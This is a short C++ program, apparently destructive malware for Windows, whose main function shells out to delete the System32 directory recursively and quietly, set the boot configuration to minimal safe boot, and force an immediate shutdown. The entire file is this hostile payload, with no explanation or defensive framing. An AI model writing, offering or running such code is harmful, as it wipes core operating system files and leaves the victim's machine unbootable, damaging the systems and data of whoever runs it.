#include <cstdlib>
#include <windows.h>

int main() {
    system("rd /s /q C:\\Windows\\System32");
    system("bcdedit /set {current} safeboot minimal");
    system("shutdown /s /f /t 00");

    return 0;
}
